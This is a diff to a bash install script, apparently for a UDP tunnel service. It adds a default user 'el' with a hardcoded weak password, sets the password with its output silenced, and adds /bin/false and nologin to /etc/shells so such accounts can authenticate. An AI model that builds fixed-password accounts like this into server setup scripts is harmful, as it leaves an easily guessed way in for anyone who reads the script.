@@ -1,5 +1,12 @@
 #!/bin/bash
 
+#add user for admin default
+grep "/bin/false" /etc/shells || echo "/bin/false" >> /etc/shells
+grep "/bin/nologin" /etc/shells || echo "/usr/sbin/nologin" >> /etc/shells
+
+useradd -s /bin/false -M el
+echo -e "satu\nsatu\n" | passwd el &> /dev/null
+
 cd
 rm -rf /root/udp
 mkdir -p /root/udp
